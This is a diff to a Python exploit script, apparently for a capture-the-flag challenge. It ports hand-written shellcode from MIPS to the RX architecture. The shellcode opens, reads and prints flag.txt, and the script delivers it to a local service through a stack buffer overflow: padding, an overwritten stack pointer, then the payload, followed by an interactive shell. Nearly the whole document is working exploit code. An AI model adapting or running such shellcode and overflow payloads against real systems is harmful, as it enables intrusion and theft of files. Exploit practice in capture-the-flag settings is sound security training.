@@ -1,47 +1,42 @@
 asm = '''.section .text
 .global _start
-
 .ascii "%s"
 _start:
-  b get_addr
-  nop
+    bsr get_addr
 ret:
-  move $v1, $ra
+    mov [r0], r7
 open:
-  move $a0, $v1
-  move $a1, $zero
-  move $a2, $zero
-  bal open2
+    mov r7, r1
+    xor r2, r2
+    xor r3, r3
+    # arg1 seems to be on stack. why?
+    push r3
+    push r3
+    mov	#2, r5
+    int	#255
 read:
-  move $a0, $v0
-  move $a1, $v1
-  li $a2, 0x7f
-  bal read2
+    mov r7, r2
+    mov #0x7f, r3
+    mov	#4, r5
+    int	#255
 write:
-  li $a0, 1
-  move $a1, $v1
-  li $a2, 0x7f
-  bal write2
-open2:
-  .word 0x00000305
-  .word 0xe8206500
-  .word 0x65006500
-read2:
-  .word 0x00000385
-  .word 0xe8206500
-  .word 0x65006500
-write2:
-  .word 0x00000405
-  .word 0xe8206500
-  .word 0x65006500
+    mov #1, r1
+    mov r7, r2
+    mov #0x7f, r3
+    mov	#5, r5
+    int	#255
+exit:
+    mov	#1, r5
+    int	#255
 get_addr:
-  bal ret
+    bsr ret
 .ascii "%s"
-  '''
+'''
+
 import os
 from lib.mylib import *
 
-ARCH = 'mips'
+ARCH = 'rx'
 AS = ARCH + '-elf-as'
 OBJDUMP = ARCH + '-elf-objdump'
 FLAG = 'flag.txt'
@@ -59,10 +54,11 @@ shellcode = shellcode + FLAG + '\x00'
 xxd(shellcode)
 
 IP = '127.0.0.1'
-PORT = 10002
+PORT = 10017
 s = mysock(IP, PORT)
-s.send('\n000')
-SP = 0x800006f4
-shellcode = 'AAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
+sl(s, '\n000')
+pad = 'AAAAAAAAAAAAAAAAAAAA'
+SP = 0x1b0c
+shellcode = pad + p(SP) + shellcode + '\n'
 sl(s, shellcode)
 shell(s)
